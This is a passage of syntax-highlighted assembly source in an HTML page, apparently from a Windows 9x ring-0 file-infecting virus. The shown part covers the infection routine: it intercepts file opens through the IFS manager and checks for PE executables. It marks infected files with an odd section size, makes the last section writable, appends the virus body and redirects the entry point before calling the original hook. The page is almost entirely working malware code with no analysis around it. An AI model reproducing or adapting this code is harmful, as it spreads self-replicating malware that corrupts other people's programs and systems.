    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">fix3</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;6</span><span class="sc0">
                                </span><span class="sc1">;39</span><span class="sc0">

    </span><span class="sc1">; open the file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;    lea     esi,[edi+namestore-startvirus]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0fio</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">notexe</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">; read the first 1024 bytes of the file</span><span class="sc0">
</span><span class="sc1">;    lea     esi,[edi+namestore-startvirus]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0fio</span><span class="sc0">

    </span><span class="sc1">; is it mz ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">5a4dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fileclose</span><span class="sc0">

    </span><span class="sc1">; get peheader offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">          </span><span class="sc1">; pe header too far along</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">fileclose</span><span class="sc0">

    </span><span class="sc1">; is it pe,0,0 ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">00004550h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fileclose</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc2">2000h</span><span class="sc0">   </span><span class="sc1">; is it a library ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fileclose</span><span class="sc0">

    </span><span class="sc1">; save the orghost</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">orghost</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc1">; locate last object in the object table</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get number of objects</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                 </span><span class="sc1">; mul 32</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                 </span><span class="sc1">; mul 8</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; add em = mul by 28h</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; nt hdr size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; add it</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc0">            </span><span class="sc1">; add 24, sub 28h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; esi+edx = last object</span><span class="sc0">

    </span><span class="sc1">; get the entrypoint rva</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; physical size</span><span class="sc0">

    </span><span class="sc1">; if last object size is odd then file already infected</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; physical size</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fileclose1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; physical offset</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">39</span><span class="sc4">],</span><span class="sc2">0e0h</span><span class="sc0">   </span><span class="sc1">; make object writable</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; physical size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">noprob</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; virtual size</span><span class="sc0">
</span><span class="sc5">noprob</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">; set the entrypoint rva</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc1">; increase the image size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc1">; write the pe header</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0fio</span><span class="sc0">

    </span><span class="sc1">; write the virus</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0fio</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">fileclose1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">fileclose</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">; close the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0fio</span><span class="sc0">

</span><span class="sc5">notexe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">inuseflag</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">okfile</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; call the old hooker</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">nexthook</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">r0fio</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">fix3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">namestore</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rstart</span><span class="sc0">

</span><span class="sc5">dummyhost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
